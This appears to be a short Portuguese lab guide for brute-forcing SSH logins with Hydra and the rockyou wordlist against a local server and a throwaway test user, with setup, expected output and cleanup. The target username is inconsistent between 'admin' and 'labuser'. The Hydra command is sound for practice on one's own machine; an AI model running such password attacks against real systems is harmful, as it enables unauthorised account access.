# **SSH**

## **Ambiente**

- Kali Linux
- Servidor SSH local ativo em `127.0.0.1:22`
- Usuário alvo: `admin`
- Wordlist: `/usr/share/wordlists/rockyou.txt`

---

## **Passos do lab**

### Verifique se o SSH está rodando

```bash
    sudo systemctl status ssh
```

### Se não estiver rodando

```bash
    sudo systemctl start ssh
```

### Crie um usuário teste para o lab

```bash
    sudo adduser labuser
```

### Habilite o SSH se ainda não estiver ativo

```bash
   sudo systemctl enable ssh
   sudo systemctl start ssh
```

Verifique

```bash
    sudo systemctl status ssh
```

### Execute o Hydra

```bash
    hydra -V -l labuser -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
```

### Resultado esperado

Senha encontrada:

```bash
    [22][ssh] host: 127.0.0.1   login: admin   password: 123456
```

Senha não encontrada:

```bash
    0 of 1 target completed, 0 valid password found
```

Quando terminar, apague o usuário

```bash
    sudo deluser --remove-home labuser
```
